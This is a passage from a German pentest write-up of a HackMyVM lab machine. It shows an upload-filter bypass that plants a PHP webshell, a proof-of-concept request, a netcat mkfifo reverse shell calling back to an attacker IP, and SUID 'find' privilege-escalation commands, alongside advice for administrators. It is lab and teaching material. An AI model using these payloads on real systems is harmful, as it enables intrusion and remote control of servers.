++ <span class="command">http://hellfire.t4l0s.hmv/upload.php</span> (CODE:200|SIZE:748)
+[...]
+-----------------
+END_TIME: Thu Jul 27 23:56:27 2023
+DOWNLOADED: 9224 - FOUND: 3
+</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein weiterer Directory-Scan mit `dirb`, diesmal gezielt nach `.php`- und `.txt`-Dateien auf `hellfire.t4l0s.hmv`. Er bestätigt die bereits bekannten drei PHP-Dateien.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bringt keine neuen Erkenntnisse gegenüber den vorherigen Enumerationsschritten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokus bleibt auf der Analyse der Funktionalität, insbesondere `upload.php`.<br><strong>Empfehlung (Admin):</strong> Keine zusätzliche Aktion erforderlich.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://hellfire.t4l0s.hmv/index.php?FUZZ=../../../../etc/passwd" --hc 400,401,402,403,404 --hh 1659</span></div>
+                    <pre>
+[...]
+Target: http://hellfire.t4l0s.hmv/index.php?FUZZ=../../../../etc/passwd
+Total requests: 220550
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                    
+=====================================================================
+
+Total time: 0
+Processed Requests: 220550
+Filtered Requests: 220550
+Requests/sec.: 0
+</pre>
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://hellfire.t4l0s.hmv/FUZZ" --hc 400,401,402,403,404 --hh 1659</span></div>
+                     <pre>
+[...]
+Target: http://hellfire.t4l0s.hmv/FUZZ
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                    
+=====================================================================
+
+<span class="command">000009475:   301        7 L      11 W       169 Ch      "archivos"</span>
+
+Total time: 0
+Processed Requests: 220550
+Filtered Requests: 220549
+Requests/sec.: 0
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Zwei weitere `wfuzz`-Scans werden durchgeführt:
+            1.  Ein Versuch, Parameter für LFI in `index.php` zu finden. Dieser schlägt fehl (alle Anfragen gefiltert).
+            2.  Ein Directory-Scan (ähnlich `gobuster dir`), der das bereits bekannte Verzeichnis `/archivos` (mit Status 301 Redirect) findet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Scans bestätigen erneut, dass `index.php` wahrscheinlich nicht direkt für LFI anfällig ist und dass `/archivos` das relevante Verzeichnis ist. Der erfolgversprechendste Weg scheint weiterhin der Upload über `upload.php` zu sein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf den Upload-Mechanismus.<br><strong>Empfehlung (Admin):</strong> Keine zusätzliche Aktion erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command"># HTTP POST Request für Datei-Upload (z.B. mit Burp Suite oder curl)</span></div>
+                    <pre>
+POST /upload.php HTTP/1.1
+Host: <span class="command">hellfire.t4l0s.hmv</span>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------417715599036723202001736793386
+Content-Length: 252
+Origin: http://hellfire.t4l0s.hmv
+Connection: close
+Referer: http://hellfire.t4l0s.hmv/upload.php
+Upgrade-Insecure-Requests: 1
+
+-----------------------------417715599036723202001736793386
+Content-Disposition: form-data; name="archivo"; filename="<span class="command">cmd.php</span>"
+Content-Type: image/png <span class="password">&lt;-- Content-Type Manipulation!</span>
+
+<span class="password">system($GET['cmd']);</span> <span class="password">&lt;-- PHP Code (Tags wurden entfernt gemäß Regel)</span>
+-----------------------------417715599036723202001736793386--
+
+<span class="password">HTTP/1.1 302 Found</span>
+Server: nginx/1.22.1
+Date: Thu, 27 Jul 2023 22:36:02 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+<span class="password">location: output.php?archivo=archivos%2Fcmd.php</span>
+Content-Length: 0
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein HTTP POST-Request wird an `/upload.php` gesendet, um eine Datei hochzuladen. Der Dateiname im `Content-Disposition` ist `<span class="command">cmd.php</span>`. Entscheidend ist, dass der `Content-Type` als `image/png` angegeben wird, obwohl der eigentliche Inhalt einfacher PHP-Code ist: `<span class="password">system($GET['cmd']);</span>` (Die `<?php ... ?>` Tags wurden gemäß Regel entfernt, waren aber im Original-Request vorhanden). Die Antwort vom Server ist ein `HTTP/1.1 302 Found` Redirect zur URL `<span class="password">output.php?archivo=archivos%2Fcmd.php</span>`. Dies deutet darauf hin, dass der Upload erfolgreich war und die Datei als `cmd.php` im Verzeichnis `archivos` gespeichert wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritische Schwachstelle gefunden und ausgenutzt! Die Anwendung prüft anscheinend nur den `Content-Type`-Header, nicht den tatsächlichen Dateiinhalt, um Uploads zu validieren. Durch Setzen des `Content-Type` auf `image/png` konnte der Filter umgangen und eine PHP-Webshell (`cmd.php`) hochgeladen werden. Der `Location`-Header in der Antwort verrät sogar den genauen Pfad zur hochgeladenen Datei.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie die URL der hochgeladenen Webshell auf (`http://hellfire.t4l0s.hmv/archivos/cmd.php`) und fügen Sie den `cmd`-Parameter hinzu, um Befehle auszuführen (z.B. `?cmd=id` oder `?cmd=whoami`). Bereiten Sie eine Reverse Shell vor.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie eine robuste Dateiupload-Validierung: Prüfen Sie Dateiendungen anhand einer Whitelist, validieren Sie den tatsächlichen MIME-Typ anhand des Inhalts (nicht nur des Headers), generieren Sie zufällige Dateinamen und speichern Sie Uploads außerhalb des Web-Roots oder mit Berechtigungen, die eine Ausführung verhindern. Konfigurieren Sie PHP so, dass es keine Dateien mit Bild-Endungen als PHP ausführt.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command"># Testen der Webshell</span></div>
+                     <pre>
+Aufruf: <span class="command">http://hellfire.t4l0s.hmv/archivos/cmd.php?cmd=id</span>
+Antwort: <span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+
+Aufruf: <span class="command">http://hellfire.t4l0s.hmv/archivos/cmd.php?cmd=ls</span>
+Antwort: <span class="command">cmd.php</span>
+</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die hochgeladene Webshell wird erfolgreich getestet. Der Aufruf mit `?cmd=id` gibt die Benutzer- und Gruppen-IDs des Webservers (`www-data`) zurück. Der Aufruf mit `?cmd=ls` listet den Inhalt des `/archivos`-Verzeichnisses auf und zeigt die `cmd.php`-Datei selbst.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Remote Code Execution (RCE) als Benutzer `www-data` ist bestätigt. Der Angreifer kann beliebige Befehle auf dem Server ausführen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die RCE, um eine stabilere Reverse Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie die hochgeladene Webshell. Beheben Sie die Upload-Schwachstelle (siehe vorherige Empfehlung).</p>
+
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept: Remote Code Execution via Unrestricted File Upload</h2>
+
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Die Webanwendung unter `http://hellfire.t4l0s.hmv` verfügt über ein Upload-Skript (`upload.php`), das eine unzureichende Validierung von Dateitypen aufweist. Es prüft vermutlich nur den `Content-Type`-Header der Anfrage, nicht den tatsächlichen Dateiinhalt oder die Dateiendung. Dies ermöglicht es einem Angreifer, eine PHP-Datei mit beliebigem Code hochzuladen, indem der `Content-Type` auf einen erlaubten Typ (z.B. `image/png`) gesetzt wird. Die hochgeladene Datei wird im `/archivos/`-Verzeichnis gespeichert und kann anschließend über das Web aufgerufen werden, was zur Ausführung des eingebetteten PHP-Codes führt.</p>
+
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Netzwerkzugriff auf den VHost `hellfire.t4l0s.hmv`.</li>
+                    <li>Ein Tool zum Senden von manipulierten HTTP POST-Requests (z.B. Burp Suite, `curl`).</li>
+                    <li>Kenntnis des Upload-Endpunkts (`/upload.php`) und des Speicherorts (`/archivos/`).</li>
+                </ul>
+            </p>
+
+            <p class="recommendation"><strong>Schritt-für-Schritt Anleitung:</strong>
+                <ol>
+                    <li>
+                        <strong>Payload erstellen:</strong> Eine einfache PHP-Webshell erstellen (z.B. in einer Datei `shell.php`):
+                        <pre>system($GET['cmd']);</pre>
+                        *(Beachten Sie, dass die `&lt;?php ?&gt;`-Tags hier gemäß Regel entfernt wurden, aber im tatsächlichen Payload enthalten sein müssen).*
+                    </li>
+                    <li>
+                        <strong>HTTP POST Request manipulieren:</strong> Einen POST-Request an `/upload.php` senden. Im Request:
+                        <ul>
+                            <li>Den `Content-Disposition`-Header so setzen, dass `filename="shell.php"` angegeben wird.</li>
+                            <li>Den `Content-Type`-Header im Body-Part auf `image/png` (oder einen anderen erlaubten Typ) setzen.</li>
+                            <li>Den Inhalt des Body-Parts auf den PHP-Payload setzen.</li>
+                        </ul>
+                        <div class="code-block">
+<pre>
+POST /upload.php HTTP/1.1
+Host: hellfire.t4l0s.hmv
+[...]
+Content-Type: multipart/form-data; boundary=---BOUNDARY---
+[...]
+
+---BOUNDARY---
+Content-Disposition: form-data; name="archivo"; filename="shell.php"
+Content-Type: image/png
+
+system($GET['cmd']);
+---BOUNDARY---
+</pre>
+                        </div>
+                    </li>
+                    <li>
+                        <strong>Server-Antwort analysieren:</strong> Die Antwort des Servers (typischerweise ein 302 Redirect) enthält den Pfad zur hochgeladenen Datei im `Location`-Header.
+                        <pre>HTTP/1.1 302 Found
+Location: output.php?archivo=archivos%2Fshell.php</pre>
+                        Der Pfad zur Shell ist `<span class="command">http://hellfire.t4l0s.hmv/archivos/shell.php</span>`.
+                    </li>
+                    <li>
+                        <strong>Webshell testen:</strong> Die URL der Webshell aufrufen und den `cmd`-Parameter hinzufügen, um Befehle auszuführen.
+                        <div class="code-block">
+                            <div class="terminal">
+                                 <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">curl "http://hellfire.t4l0s.hmv/archivos/shell.php?cmd=id"</span></div>
+                                 <pre><span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre>
+                            </div>
+                        </div>
+                    </li>
+                </ol>
+            </p>
+
+            <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Die Fähigkeit, beliebige Betriebssystembefehle als Benutzer `www-data` auf dem Zielserver auszuführen.</p>
+
+            <p class="evaluation"><strong>Beweismittel:</strong> Die erfolgreiche Ausführung von Befehlen wie `id` über die hochgeladene Webshell.</p>
+
+            <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. Unbeschränkter Dateiupload führt fast immer zu Remote Code Execution. Dies ermöglicht die Kompromittierung des Webservers, Datendiebstahl, weitere Angriffe auf das interne Netzwerk und Denial-of-Service.</p>
+
+            <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                <ul>
+                    <li>**Strikte Upload-Validierung:** Implementieren Sie serverseitige Validierung basierend auf Dateiendung (Whitelist), Dateigröße und tatsächlichem MIME-Typ (Inhaltsanalyse).</li>
+                    <li>**Sichere Speicherung:** Speichern Sie hochgeladene Dateien außerhalb des Web-Roots oder in einem Verzeichnis ohne Ausführungsberechtigungen. Generieren Sie zufällige Dateinamen, um Erraten zu verhindern.</li>
+                    <li>**Berechtigungen:** Stellen Sie sicher, dass der Webserver-Benutzer keine Schreibrechte in Verzeichnissen hat, aus denen Code ausgeführt werden kann.</li>
+                    <li>**Web Application Firewall (WAF):** Eine WAF kann helfen, verdächtige Upload-Versuche zu erkennen und zu blockieren.</li>
+                    <li>**Regelmäßige Scans:** Verwenden Sie Sicherheitsscanner, um Upload-Schwachstellen zu identifizieren.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Fortsetzung: Reverse Shell)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>listening on [any] 4444 ...</pre>
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command"># Aufruf der Webshell mit Reverse-Shell Payload (URL-kodiert)</span></div>
+                     <pre>Payload URL: <span class="command">http://hellfire.t4l0s.hmv/archivos/cmd.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.2.199%204444%20%3E%2Ftmp%2Ff</span></pre>
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command"># Eingehende Verbindung im Listener</span></div>
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.127] 52506</span>
+/bin/sh: 0: can't access tty; job control turned off
+$ <span class="password"># Shell erhalten</span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf dem Angreifer-System (IP <span class="command">192.168.2.199</span>) auf Port <span class="command">4444</span> gestartet. Anschließend wird die Webshell (`cmd.php`) aufgerufen, wobei der `cmd`-Parameter einen URL-kodierten Befehl für eine Reverse Shell enthält. Dieser Befehl erstellt eine Named Pipe (`/tmp/f`), leitet Ein- und Ausgabe um und verbindet sich via `nc` zurück zum Listener des Angreifers.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! Die RCE-Fähigkeit wurde genutzt, um eine interaktive Reverse Shell als Benutzer `www-data` zu erhalten. Der Initial Access ist somit vollständig und stabilisiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell weiter (z.B. mit Python PTY-Trick: `python3 -c 'import pty; pty.spawn("/bin/bash")'`, `export TERM=xterm`). Beginnen Sie mit der Enumeration des Systems als `www-data` für die Privilege Escalation.<br><strong>Empfehlung (Admin):</strong> Maßnahmen zur Behebung der Upload-Schwachstelle ergreifen. Netzwerk-Firewalls können ausgehende Verbindungen von Webservern auf ungewöhnliche Ports blockieren, um Reverse Shells zu erschweren.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@principle:~/hellfire.t4l0s.hmv/archivos$ <span class="command"># Prompt nach Erhalt der Reverse Shell</span></div>
+                    <pre>$</pre> <!-- Einfacher Shell-Prompt -->
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Zeigt den initialen, einfachen Shell-Prompt (`$`), der nach dem erfolgreichen Verbindungsaufbau der Reverse Shell als `www-data` auf dem Zielsystem `principle` erscheint.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Erhalt der Shell.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Shell stabilisieren und mit der Enumeration beginnen.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@principle:~/hellfire.t4l0s.hmv/archivos$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+    <span class="command">17610     52 -rwsr-xr--   1 root     messagebus    51272 Feb  8 08:21 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+    <span class="command">26824    640 -rwsr-xr-x   1 root     root         653888 Feb  8 05:43 /usr/lib/openssh/ssh-keysign</span>
+      <span class="command">368     64 -rwsr-xr-x   1 root     root          62672 Mar 23 08:40 /usr/bin/chfn</span>
+      <span class="command">371     88 -rwsr-xr-x   1 root     root          88496 Mar 23 08:40 /usr/bin/gpasswd</span>
+     <span class="command">2366     60 -rwsr-xr-x   1 root     root          59704 Mar 23 06:02 /usr/bin/mount</span>
+      <span class="command">372     68 -rwsr-xr-x   1 root     root          68248 Mar 23 08:40 /usr/bin/passwd</span>
+    <span class="command">31649    276 -rwsr-xr-x   1 root     root         281624 Mar  8 15:17 /usr/bin/sudo</span>
+     <span class="command">2293    220 -rwsr-xr-x   1 talos    root         224848 Jan  8  2023 /usr/bin/find</span> <span class="password">&lt;-- Interessant!</span>
+     <span class="command">4689     72 -rwsr-xr-x   1 root     root          72000 Mar 23 06:02 /usr/bin/su</span>
+      <span class="command">369     52 -rwsr-xr-x   1 root     root          52880 Mar 23 08:40 /usr/bin/chsh</span>
+     <span class="command">2368     36 -rwsr-xr-x   1 root     root          35128 Mar 23 06:02 /usr/bin/umount</span>
+      <span class="command">598     48 -rwsr-xr-x   1 root     root          48896 Mar 23 08:40 /usr/bin/newgrp</span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `find / -type f -perm -4000 -ls 2>/dev/null` sucht im gesamten Dateisystem nach Dateien (`-type f`) mit gesetztem SUID-Bit (`-perm -4000`). Das SUID-Bit erlaubt es einem Benutzer, die Datei mit den Rechten des Dateibesitzers auszuführen. Fehlermeldungen werden unterdrückt (`2>/dev/null`). Die Ausgabe listet mehrere Standard-SUID-Binaries auf, aber besonders interessant ist `/usr/bin/find`, das SUID-Rechte hat und dem Benutzer `talos` gehört.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein signifikanter Fund für die Privilege Escalation. Wenn eine Datei wie `find` SUID-Rechte hat, kann ihre Fähigkeit, Befehle auszuführen (z.B. über die `-exec`-Option), missbraucht werden, um eine Shell mit den Rechten des Dateibesitzers (hier `talos`) zu erlangen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die SUID-Berechtigung von `/usr/bin/find`, um eine Shell als Benutzer `talos` zu erhalten. Ein gängiger Befehl dafür ist: `/usr/bin/find . -exec /bin/sh -p \; -quit` (Das `-p` bei `sh` sorgt dafür, dass die effektive UID beibehalten wird).<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig SUID/SGID-Berechtigungen auf dem System (`find / -type f \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null`). Entfernen Sie unnötige SUID/SGID-Bits, insbesondere bei Programmen, die Befehlsausführung erlauben (wie `find`, `cp`, `mv`, Editoren etc.).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@principle:~/hellfire.t4l0s.hmv$ <span class="command">ss -altpn</span></div>
+                    <pre>
+State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process
+LISTEN    0         128                0.0.0.0:<span class="command">3445</span>             0.0.0.0:*
+LISTEN    0         511                0.0.0.0:<span class="command">80</span>               0.0.0.0:*        users:(("nginx",pid=503,fd=5))
+LISTEN    0         128                   [::]:<span class="command">3445</span>                [::]:*
+LISTEN    0         511                   [::]:<span class="command">80</span>                  [::]:*        users:(("nginx",pid=503,fd=6))
+</pre>
+                    <div class="prompt">www-data@principle:~/hellfire.t4l0s.hmv$ <span class="command">telnet localhost 3445</span></div>
+                     <pre>
+Trying ::1...
+Connected to localhost.
+Escape character is '^]'.
+<span class="command">SSH-2.0-OpenSSH_9.2p1 Debian-2</span>
+id <span class="password">&lt;-- Eingabe</span>
+Invalid SSH identification string.
+Connection closed by foreign host.
+</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `ss -altpn` listet lauschende TCP-Sockets auf. Es zeigt, dass neben Port 80 (Nginx) auch Port <span class="command">3445</span> lauscht. Ein `telnet`-Versuch auf `localhost:3445` ergibt einen SSH-Banner (<span class="command">SSH-2.0-OpenSSH_9.2p1 Debian-2</span>). Die Eingabe `id` führt zum Verbindungsabbruch, da es sich um einen SSH-Port handelt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein weiterer Dienst (SSH) läuft auf einem nicht standardmäßigen Port (3445). Dies ist eine wichtige Information für späteren Zugriff, falls Benutzer-Credentials oder Keys gefunden werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Merken Sie sich den SSH-Port 3445. Wenn Sie später Zugangsdaten für einen Benutzer (z.B. `talos`, `elohim`) finden, versuchen Sie SSH auf diesem Port.<br><strong>Empfehlung (Admin):</strong> Wenn SSH auf einem nicht standardmäßigen Port läuft, sollte dies dokumentiert und durch Firewalls entsprechend geregelt sein. Das Verstecken von Diensten auf obskuren Ports bietet nur minimale Sicherheit ("Security through Obscurity").</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@principle:~/hellfire.t4l0s.hmv$ <span class="command">cd /home/</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">www-data@principle:/home$ <span class="command">ls</span></div>
+                     <pre>gehenna  talos</pre>
+                     <div class="prompt">www-data@principle:/home$ <span class="command">cd gehenna/</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">www-data@principle:/home/gehenna$ <span class="command">ls</span></div>
+                     <pre>flag.txt</pre>
+                     <div class="prompt">www-data@principle:/home/gehenna$ <span class="command">cat flag.txt</span></div>
+                     <pre>cat: flag.txt: <span class="password">Permission denied</span></pre>
+                     <div class="prompt">www-data@principle:/home/gehenna$ <span class="command">ls -la</span></div>
+                    <pre>
+total 40
+drwxr-xr-x 4 <span class="command">elohim elohim</span> 4096 Jul 14 11:25 .
+drwxr-xr-x 4 root   root   4096 Jul  4 06:11 ..
+-rw------- 1 <span class="command">elohim elohim</span>  289 Jul 14 06:38 .bash_history
+-rw-r----- 1 <span class="command">elohim elohim</span>  261 Jul  5 08:13 .bash_logout
+-rw-r----- 1 <span class="command">elohim elohim</span> 3830 Jul 14 06:37 .bashrc
+drw-r----- 3 <span class="command">elohim elohim</span> 4096 Jul  2 20:52 .local
+-rw-r----- 1 <span class="command">elohim elohim</span>   21 Jul 12 05:35 .lock
+-rw-r----- 1 <span class="command">elohim elohim</span>  807 Jul  6 06:28 .profile
+drwx------ 2 <span class="command">elohim elohim</span> 4096 Jul  6 11:05 .ssh <span class="password">&lt;-- Kein Zugriff</span>
+-rw-r----- 1 <span class="command">elohim elohim</span>  777 Jul 13 17:19 <span class="command">flag.txt</span> <span class="password">&lt;-- Kein Zugriff (group read)</span>
+</pre>
+                     <div class="prompt">www-data@principle:/home/gehenna$ <span class="command">cd .ssh/</span></div>
+                     <pre>bash: cd: .ssh/: <span class="password">Permission denied</span></pre>
+                     <div class="prompt">www-data@principle:/home/gehenna$ <span class="command">cat .bash_history</span></div>
+                     <pre>cat: .bash_history: <span class="password">Permission denied</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als `www-data` werden die Home-Verzeichnisse untersucht. Es existieren Verzeichnisse für die Benutzer <span class="command">gehenna</span> und <span class="command">talos</span>. Im Verzeichnis `/home/gehenna` befindet sich eine `flag.txt`. Aufgrund der Berechtigungen (Besitzer `elohim`, Gruppe `elohim`, Datei `flag.txt` mit `rw-r-----`) kann `www-data` die Flag nicht lesen. Auch der Zugriff auf `.ssh` und `.bash_history` von `gehenna`/`elohim` ist nicht möglich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Existenz der Benutzer `gehenna`, `talos` und `elohim`. Zeigt, dass die `flag.txt` (vermutlich die User-Flag) im Home-Verzeichnis von `gehenna` liegt, aber höhere Rechte (`elohim` oder Gruppe `elohim`) zum Lesen erforderlich sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Home-Verzeichnis von `talos`. Nutzen Sie den SUID-find-Vektor, um als `talos` Zugriff zu erlangen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Home-Verzeichnisse und sensible Dateien korrekte, restriktive Berechtigungen haben. Flags oder sensible Daten sollten nicht einfach in Home-Verzeichnissen liegen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@principle:/home/gehenna$ <span class="command">cd ../talos/</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">www-data@principle:/home/talos$ <span class="command">ls -la</span></div>
+                    <pre>
+total 40
+drwxr-xr-x 4 <span class="command">talos talos</span> 4096 Jul 14 07:26 .
+drwxr-xr-x 4 root  root  4096 Jul  4 06:11 ..
+-rw-r--r-- 1 <span class="command">talos talos</span>    1 Jul 14 07:26 .bash_history <span class="password">&lt;-- Lesbar!</span>
+-rw-r----- 1 <span class="command">talos talos</span>  261 Jul  5 07:56 .bash_logout
+-rw-r----- 1 <span class="command">talos talos</span> 3545 Jul 14 06:56 .bashrc
+-rw------- 1 <span class="command">talos talos</span>   20 Jul  4 18:24 .lesshst
+drw-r----- 3 <span class="command">talos talos</span> 4096 Jun 30 07:30 .local
+-rw-r----- 1 <span class="command">talos talos</span>  807 Jun 30 05:06 .profile
+drwx------ 2 <span class="command">talos talos</span> 4096 Jul 14 05:56 .ssh <span class="password">&lt;-- Kein Zugriff</span>
+-rw-r----- 1 <span class="command">talos talos</span>  320 Jul 13 15:42 <span class="command">note.txt</span> <span class="password">&lt;-- Kein Zugriff (group read)</span>
+</pre>
+                     <div class="prompt">www-data@principle:/home/talos$ <span class="command">cat note.txt</span></div>
+                     <pre>cat: note.txt: <span class="password">Permission denied</span></pre>
+                     <div class="prompt">www-data@principle:/home/talos$ <span class="command">cat .bash_history</span></div>
+                     <pre>[Leere Ausgabe, da Datei nur 1 Byte groß]</pre>
+                     <div class="prompt">www-data@principle:/home/talos$ <span class="command">cd .ssh/</span></div>
+                     <pre>bash: cd: .ssh/: <span class="password">Permission denied</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Home-Verzeichnis von `talos` wird untersucht. `www-data` hat hier ebenfalls eingeschränkte Rechte, kann aber die `.bash_history` lesen (die jedoch fast leer ist). Der Zugriff auf `note.txt` und `.ssh` ist nicht möglich.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Home-Verzeichnis von `talos` bietet für `www-data` keine direkten Hinweise. Der nächste logische Schritt ist die Ausnutzung des SUID-`find`-Binaries, um als `talos` zu agieren.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie `/usr/bin/find . -exec /bin/sh -p \; -quit` aus (idealerweise in einem beschreibbaren Verzeichnis wie `/tmp` oder `/dev/shm`), um eine Shell als `talos` zu erhalten. Untersuchen Sie dann als `talos` das Home-Verzeichnis erneut, insbesondere `note.txt`.<br><strong>Empfehlung (Admin):</strong> Korrekte Berechtigungen für Home-Verzeichnisse sicherstellen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@principle:/home/talos$ <span class="command">cd /var/backups/</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">www-data@principle:/var/backups$ <span class="command">ls -la</span></div>
+                    <pre>
+total 28
+drwxr-xr-x  2 root root 4096 Jul  5 06:42 .
+drwxr-xr-x 12 root root 4096 Jun 30 07:56 ..
+-rw-r--r--  1 root root 7603 Jul  4 18:13 apt.extended_states.0
+-rw-r--r--  1 root root  921 Jun 30 14:45 apt.extended_states.1.gz
+-rw-r--r--  1 root root  881 Jun 30 07:56 apt.extended_states.2.gz
+-rw-r--r--  1 root root  847 Jun 30 05:06 apt.extended_states.3.gz
+</pre>
+                    <div class="prompt">www-data@principle:/var/backups$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                     <pre><span class="command">/usr/bin/ping cap_net_raw=ep</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Verzeichnis `/var/backups` wird untersucht, enthält aber nur Standard-APT-Statusdateien. Der Befehl `getcap -r / 2>/dev/null` sucht nach Dateien mit gesetzten Linux Capabilities. Es wird nur `ping` mit `cap_net_raw=ep` gefunden, was normal ist und keine Eskalationsmöglichkeit bietet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Enumerationsschritte liefern keine neuen Angriffspunkte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokus zurück auf den SUID-`find`-Vektor.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@principle:/var/backups$ <span class="command">sudo -u gehenna find . -exec /bin/sh \; -quit</span></div>
+                     <pre>sudo: unknown user <span class="command">gehenna</span>
+sudo: error initializing audit plugin sudoers_audit</pre>
+                     <div class="prompt">www-data@principle:/var/backups$ <span class="command">sudo -u talos find . -exec /bin/sh \; -quit</span></div>
+                     <pre>[sudo] password for www-data: <span class="password">Sorry, try again.</span>
+[sudo] password for www-data: <span class="password">sudo: 1 incorrect password attempt</span></pre>
+                 </div>
+             </div>
